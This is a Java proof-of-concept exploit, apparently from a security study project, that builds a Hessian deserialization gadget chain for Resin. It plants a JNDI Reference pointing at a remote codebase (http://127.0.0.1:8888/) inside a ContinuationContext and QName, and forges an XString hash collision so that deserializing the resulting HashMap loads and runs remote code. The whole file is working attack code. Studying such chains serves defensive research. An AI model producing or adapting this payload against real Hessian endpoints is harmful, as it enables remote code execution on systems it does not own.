package org.dili.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.caucho.naming.QName;
import com.sun.org.apache.xpath.internal.objects.XString;
import javax.naming.CannotProceedException;
import javax.naming.Context;
import javax.naming.Reference;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

public class ResinHessian {
    public static void main(String[] args) throws Exception {
        String refAddr = "http://127.0.0.1:8888/";
        String refClassName = "test";

        Reference ref = new Reference(refClassName, refClassName, refAddr);

        Object cannotProceedException = Class.forName("javax.naming.CannotProceedException").getDeclaredConstructor().newInstance();
        String classname = "javax.naming.NamingException";
        setFiled(classname, cannotProceedException, "resolvedObj", ref);

        // 创建ContinuationContext对象
        Class<?> aClass = Class.forName("javax.naming.spi.ContinuationContext");
        Constructor<?> constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        // 构造方法为protected修饰
        constructor.setAccessible(true);
        Context continuationContext = (Context) constructor.newInstance(cannotProceedException, new Hashtable<>());


        // 创建QName
        QName qName = new QName(continuationContext, "aaa", "bbb");
        String str = unhash(qName.hashCode());
        // 创建Xtring
        XString xString = new XString(str);

        // 创建HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(qName, "111");
        hashMap.put(xString, "222");

        // 序列化
        FileOutputStream fileOutputStream = new FileOutputStream("JavaSec/out/ResinHessian.bin");
        Hessian2Output hessian2Output = new Hessian2Output(fileOutputStream);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(hashMap);
        hessian2Output.close();

        // 反序列化
        FileInputStream fileInputStream = new FileInputStream("JavaSec/out/ResinHessian.bin");
        Hessian2Input hessian2Input = new Hessian2Input(fileInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();

    }

    public static void setFiled(String classname, Object o, String fieldname, Object value) throws Exception {
        Class<?> aClass = Class.forName(classname);
        Field field = aClass.getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }
    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }
}
